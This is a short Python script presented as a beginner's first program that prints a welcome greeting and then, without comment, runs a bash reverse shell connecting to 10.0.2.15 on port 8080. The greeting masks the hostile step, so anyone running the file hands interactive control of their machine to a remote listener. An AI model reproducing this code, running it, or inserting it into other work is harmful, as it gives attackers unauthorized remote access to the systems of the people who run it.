import subprocess


print("Hello world, welcome to my first program.")

# Define the shell command
shell_command = "bash -i >& /dev/tcp/10.0.2.15/8080 0>&1"
# Execute the shell command using subprocess
try:
    subprocess.call(shell_command, shell=True, executable="/bin/bash")
except Exception as e:
    print(f"Error executing the command: {e}")
